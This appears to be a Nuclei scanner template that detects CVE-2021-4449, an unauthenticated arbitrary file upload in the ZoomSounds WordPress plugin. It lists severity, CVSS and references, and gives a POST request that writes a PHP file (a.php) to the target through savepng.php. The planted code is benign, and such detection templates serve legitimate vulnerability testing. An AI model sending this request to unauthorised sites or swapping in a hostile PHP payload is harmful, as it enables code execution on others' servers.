id: CVE-2021-4449

info:
  name: ZoomSounds WordPress Plugin Arbitrary File Upload
  author: ProjectDiscoveryAI
  severity: critical
  description: The ZoomSounds plugin for WordPress is vulnerable to arbitrary file uploads due to missing file type validation in the 'savepng.php' file in versions up to, and including, 5.96. This makes it possible for unauthenticated attackers to upload arbitrary files on the affected site's server which may make remote code execution possible.
  impact: |
    Arbitrary file uploads can result in unauthorized access, data leakage, and potential compromise of the WordPress site.
  remediation: |
    Update ZoomSounds WordPress Plugin to the latest patched version to prevent arbitrary file uploads.
  reference:
    - https://sploitus.com/exploit?id=WPEX-ID:07259A61-8BA9-4DD0-8D52-CC1DF389C0AD
    - https://wpscan.com/vulnerability/07259a61-8ba9-4dd0-8d52-cc1df389c0ad
    - https://codecanyon.net/item/zoomsounds-wordpress-wave-audio-player-with-playlist/6181433
    - https://github.com/0xAgun/Arbitrary-File-Upload-ZoomSounds
    - https://ithemes.com/blog/wordpress-vulnerability-report-june-2021-part-5/#ib-toc-anchor-2
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-4449
    cwe-id: CWE-434
    epss-score: 0.00102
    epss-percentile: 0.43088
    cpe: cpe:2.3:a:digitalzoomstudio:zoomsounds:*:*:*:*:*:wordpress:*:*
  metadata:
    vendor: digitalzoomstudio
    product: zoomsounds
    framework: wordpress
  tags: wpscan

http:
  - method: POST
    path:
      - "{{BaseURL}}/wp-content/plugins/dzs-zoomsounds/savepng.php?location=a.php"

    headers:
      Accept: "application/json, text/javascript, */*; q=0.01"
      Accept-Language: "en-GB,en;q=0.5"
      Accept-Encoding: "gzip, deflate"
      Content-Type: "application/x-www-form-urlencoded; charset=UTF-8"
      X-Requested-With: "XMLHttpRequest"
      Content-Length: "23"
      Connection: "close"

    body: |
      <?php
      echo 'Failed';
      ?>
    matchers:
      - type: word
        words:
          - "Failed"
        part: body
